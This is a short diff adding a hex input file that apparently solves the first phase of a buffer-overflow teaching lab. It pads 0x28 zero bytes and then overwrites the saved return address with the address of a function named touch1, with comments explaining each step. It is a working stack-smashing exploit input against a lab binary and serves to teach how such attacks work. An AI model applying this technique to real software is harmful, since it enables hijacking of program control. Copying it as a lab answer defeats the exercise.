@@ -1,0 +1,6 @@
+00 00 00 00 00 00 00 00     /* begin of buffer, overwrite with 0 */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00     /* end of buffer, totally 0x28 bytes, tell by 0x28 offset of %rsp */
+c0 17 40 00 00 00 00 00     /* address of function <touch1>, little endian */
